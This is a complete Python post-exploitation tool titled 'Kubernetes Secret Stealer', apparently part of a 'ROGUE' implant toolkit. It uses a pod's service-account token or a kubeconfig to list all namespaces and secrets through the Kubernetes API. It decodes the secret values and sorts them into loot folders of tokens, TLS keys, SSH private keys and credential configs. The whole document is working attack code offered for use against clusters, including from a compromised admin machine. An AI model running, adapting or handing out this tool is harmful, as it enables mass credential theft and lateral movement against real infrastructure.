#!/usr/bin/env python3
"""
Kubernetes Secret Stealer - standalone payload (ROGUE v3.3)
============================================================
Dumps Kubernetes secrets (and the interesting material inside them) from a
cluster the current context can already read. Works two ways:

  1. IN-CLUSTER (running inside a pod):
     - uses the mounted service account
       (/var/run/secrets/kubernetes.io/serviceaccount/)
     - only needs the RBAC the pod's SA already has
  2. OUT-OF-CLUSTER (operator laptop / compromised admin box):
     - reads ~/.kube/config (or $KUBECONFIG) and uses the current context
     - supports token/bearer auth (client-cert auth prints a clear error)

Pure stdlib (urllib + ssl). No kubectl, no pip dependencies.

Usage:
  python3 k8s_secret_stealer.py --dump-all
  python3 k8s_secret_stealer.py --target-namespace kube-system
  python3 k8s_secret_stealer.py --target-namespace kube-system --target-secret mysecret
  python3 k8s_secret_stealer.py --dump-all --insecure     # labs w/ self-signed API
  python3 k8s_secret_stealer.py --dump-all --output-dir /tmp/x

Output contract (parsed by the ROGUE implant wrapper):
  prints "Output directory: <dir>" on its own line
  organizes loot under <dir>/tokens, <dir>/certificates, <dir>/ssh_keys,
  <dir>/configs and <dir>/raw/<namespace>/
"""

import argparse
import base64
import json
import os
import re
import ssl
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

SA_DIR = "/var/run/secrets/kubernetes.io/serviceaccount"
INTERESTING_KEY_HINTS = {
    "ssh_keys": ("ssh-privatekey", "id_rsa", "id_ed25519", "id_ecdsa", "privatekey", "ssh_host"),
    "certificates": (".crt", ".pem", ".key", "tls.crt", "tls.key", "ca.crt", "ca.key", ".cert"),
    "configs": ("kubeconfig", "config.json", ".dockercfg", "password", "credentials", "passwd", "secret", "token-", "connectionstring"),
}


class KubeClient(object):
    """Minimal Kubernetes API client (core /api/v1 only), stdlib https."""

    def __init__(self, server, token=None, ca_path=None, insecure=False, timeout=20):
        self.server = server.rstrip("/")
        self.token = token
        self.timeout = timeout
        ctx = ssl.create_default_context(cafile=ca_path) if ca_path else ssl.create_default_context()
        if insecure:
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
        self.ctx = ctx

    def _request(self, path):
        req = urllib.request.Request(self.server + path, headers={"Accept": "application/json"})
        if self.token:
            req.add_header("Authorization", "Bearer " + self.token)
        try:
            with urllib.request.urlopen(req, context=self.ctx, timeout=self.timeout) as r:
                return json.loads(r.read().decode("utf-8"))
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")[:300]
            return {"_error": e.code, "_reason": body}

    def list_namespaces(self):
        data = self._request("/api/v1/namespaces?limit=500")
        if "_error" in data:
            return None, "%s %s" % (data["_error"], data["_reason"])
        return [ns["metadata"]["name"] for ns in data.get("items", [])], None

    def list_secrets(self, namespace):
        """Returns (secrets, error) with simple pagination (<=10 pages)."""
        secrets, cont = [], ""
        for _ in range(10):
            path = "/api/v1/namespaces/%s/secrets?limit=500" % namespace
            if cont:
                path += "&continue=%s" % urllib.parse.quote(cont)
            data = self._request(path)
            if "_error" in data:
                if not secrets:
                    return None, "%s %s" % (data["_error"], data["_reason"])
                break
            secrets.extend(data.get("items", []))
            cont = data.get("metadata", {}).get("continue", "")
            if not cont:
                break
        return secrets, None


def _load_incluster():
    if not os.path.exists(os.path.join(SA_DIR, "token")):
        return None
    host = os.environ.get("KUBERNETES_SERVICE_HOST")
    port = os.environ.get("KUBERNETES_SERVICE_PORT", "443")
    if not host:
        return None
    with open(os.path.join(SA_DIR, "token")) as f:
        token = f.read().strip()
    ca = os.path.join(SA_DIR, "ca.crt")
    return "https://%s:%s" % (host, port), token, ca if os.path.exists(ca) else None


def _parse_kubeconfig(path):
    """Very small kubeconfig reader: current-context cluster server + token.
    Returns (server, token, ca_path, error)."""
    try:
        with open(path) as f:
            raw = f.read()
    except Exception as e:
        return None, None, None, "cannot read %s: %s" % (path, e)

    m = re.search(r"current-context:\s*(\S+)", raw)
    cur = m.group(1) if m else None

    def blocks(text, key):
        """crude but sufficient: split top-level list items of 'key:' sections"""
        out = []
        for bm in re.finditer(r"^\s*-\s+name:\s*(\S+)", text, re.M):
            out.append(bm.group(1))
        return out

    def section(text, name, kind):
        m = re.search(r"%s:\s*\n\s*-\s+name:\s*%s(.*?)(?=\n\s*[a-z-]+:|\Z)" % (kind, re.escape(name)), text, re.S)
        return m.group(1) if m else ""

    def extract(text, key):
        """Line-based yaml-ish value extraction; strips quotes/commas."""
        for line in text.splitlines():
            m = re.match(r"\s*%s:\s*(.*)$" % key, line)
            if m:
                val = m.group(1).strip()
                val = val.rstrip(",")
                if val.startswith("{") or val == "":
                    continue  # inline map or empty -> not supported, skip
                if (val.startswith('"') and val.endswith('"')) or (val.startswith("'") and val.endswith("'")):
                    val = val[1:-1]
                return val
        return None

    # contexts map
    ctx_block = re.search(r"contexts:(.*?)(?=\n[a-z-]+:|\Z)", raw, re.S)
    contexts = {}
    if ctx_block:
        for cm in re.finditer(r"name:\s*(\S+)(.*?)(?=name:\s*\S+|\Z)", ctx_block.group(1), re.S):
            cluster = extract(cm.group(2), "cluster")
            user = extract(cm.group(2), "user")
            if cluster and user:
                contexts[cm.group(1)] = (cluster, user)
    if not contexts:
        return None, None, None, "no contexts found in kubeconfig"
    cluster_name, user_name = contexts.get(cur) or next(iter(contexts.values()))

    clusters = {}
    cl_block = re.search(r"clusters:(.*?)(?=\n[a-z-]+:|\Z)", raw, re.S)
    if cl_block:
        for cm in re.finditer(r"name:\s*(\S+)(.*?)(?=name:\s*\S+|\Z)", cl_block.group(1), re.S):
            server = extract(cm.group(2), "server")
            cadata = extract(cm.group(2), "certificate-authority-data")
            if server:
                clusters[cm.group(1)] = {"server": server, "cad": cadata}

    users = {}
    us_block = re.search(r"users:(.*?)(?=\n[a-z-]+:|\Z)", raw, re.S)
    if us_block:
        for um in re.finditer(r"name:\s*(\S+)(.*?)(?=name:\s*\S+|\Z)", us_block.group(1), re.S):
            token = extract(um.group(2), "token")
            users[um.group(1)] = {"token": token}

    cluster = clusters.get(cluster_name) or {}
    server = cluster.get("server")
    if not server:
        return None, None, None, "cluster server not found in kubeconfig"
    ca_path = None
    cad = cluster.get("cad")
    if cad:
        ca_path = os.path.join(os.path.dirname(os.path.abspath(path)), "kube_ca_%d.crt" % os.getpid())
        try:
            with open(ca_path, "wb") as f:
                f.write(base64.b64decode(cad))
        except Exception:
            ca_path = None
    token = (users.get(user_name) or {}).get("token")
    return server, token, ca_path, None


def _classify(name, data):
    """Classify a secret entry into a loot bucket."""
    low = name.lower()
    for bucket, hints in INTERESTING_KEY_HINTS.items():
        for h in hints:
            if h in low:
                return bucket
    return None


def _write_loot(out_dir, ns, secret_name, entry_name, value_bytes, sec_type=""):
    """Write decoded secret material into the right bucket, returns (bucket, path)."""
    if sec_type == "kubernetes.io/service-account-token" and entry_name == "token":
        bucket = "tokens"
    else:
        bucket = _classify(entry_name, value_bytes)
    if not bucket:
        bucket = "misc"
    safe_ns = re.sub(r"[^A-Za-z0-9_.-]", "_", ns)
    safe_sec = re.sub(r"[^A-Za-z0-9_.-]", "_", secret_name)
    safe_key = re.sub(r"[^A-Za-z0-9_.-]", "_", entry_name)
    bucket_dir = os.path.join(out_dir, bucket)
    os.makedirs(bucket_dir, exist_ok=True)
    out_path = os.path.join(bucket_dir, "%s__%s__%s" % (safe_ns, safe_sec, safe_key))
    with open(out_path, "wb") as f:
        f.write(value_bytes)
    return bucket, out_path


def dump(client, args):
    out_dir = args.output_dir or ("k8s_dump_%d" % int(time.time()))
    os.makedirs(out_dir, exist_ok=True)
    print("Output directory: %s" % os.path.abspath(out_dir))

    namespaces, err = client.list_namespaces()
    if err:
        print("[!] Cannot list namespaces: %s" % err)
        print("[!] Check RBAC: the service account needs list/get on secrets (and namespaces).")
        return 1

    targets = namespaces
    if args.target_namespace:
        targets = [args.target_namespace]
        if args.target_namespace not in namespaces:
            # still try: the API may allow reading the ns even if list is denied
            targets = [args.target_namespace]

    total_files = 0
    skipped = 0
    for ns in targets:
        secrets, err = client.list_secrets(ns)
        if err:
            print("[-] %s: %s" % (ns, err))
            skipped += 1
            continue
        if not secrets:
            continue
        ns_raw_dir = os.path.join(out_dir, "raw", re.sub(r"[^A-Za-z0-9_.-]", "_", ns))
        os.makedirs(ns_raw_dir, exist_ok=True)
        for sec in secrets:
            name = sec.get("metadata", {}).get("name", "unknown")
            if args.target_secret and name != args.target_secret:
                continue
            with open(os.path.join(ns_raw_dir, "%s.json" % re.sub(r"[^A-Za-z0-9_.-]", "_", name)), "w") as f:
                json.dump(sec, f, indent=2)
            data = sec.get("data") or {}
            sec_type = sec.get("type", "")
            for k, v in data.items():
                try:
                    val = base64.b64decode(v)
                except Exception:
                    continue
                bucket, path = _write_loot(out_dir, ns, name, k, val, sec_type)
                total_files += 1
                if args.verbose:
                    print("  [+] [%s/%s] %s -> %s (%d bytes)" % (ns, name, k, bucket, len(val)))
            print("[+] %s/%s : %d entries" % (ns, name, len(data)))

    print("[+] Total loot files written: %d (namespaces skipped: %d)" % (total_files, skipped))
    for bucket in ("tokens", "certificates", "ssh_keys", "configs"):
        d = os.path.join(out_dir, bucket)
        if os.path.isdir(d):
            print("[+] %s: %d items" % (bucket, len(os.listdir(d))))
    return 0


def main():
    ap = argparse.ArgumentParser(description="Kubernetes secret stealer (stdlib-only)")
    ap.add_argument("--dump-all", action="store_true", help="dump secrets from all accessible namespaces")
    ap.add_argument("--target-namespace", default=None, help="only this namespace")
    ap.add_argument("--target-secret", default=None, help="only this secret name (with --target-namespace)")
    ap.add_argument("--kubeconfig", default=os.environ.get("KUBECONFIG") or os.path.expanduser("~/.kube/config"),
                    help="kubeconfig path (out-of-cluster only)")
    ap.add_argument("--insecure", action="store_true", help="skip TLS verification (labs only)")
    ap.add_argument("--output-dir", default=None, help="where loot goes (default ./k8s_dump_<ts>)")
    ap.add_argument("--verbose", action="store_true")
    args = ap.parse_args()

    if not (args.dump_all or args.target_namespace):
        ap.error("use --dump-all or --target-namespace")

    server = token = ca_path = None
    source = "in-cluster service account"
    ic = _load_incluster()
    if ic:
        server, token, ca_path = ic
    else:
        source = "kubeconfig %s" % args.kubeconfig
        server, token, ca_path, kerr = _parse_kubeconfig(args.kubeconfig)
        if not server:
            print("[!] No in-cluster service account found.")
            print("[!] kubeconfig parse failed: %s" % kerr)
            print("[!] Only token/bearer kubeconfigs are supported (client-cert auth is not).")
            return 1

    client = KubeClient(server, token=token, ca_path=ca_path, insecure=args.insecure)
    print("[*] K8s API: %s (via %s)" % (server, source))
    return dump(client, args)


if __name__ == "__main__":
    sys.exit(main())
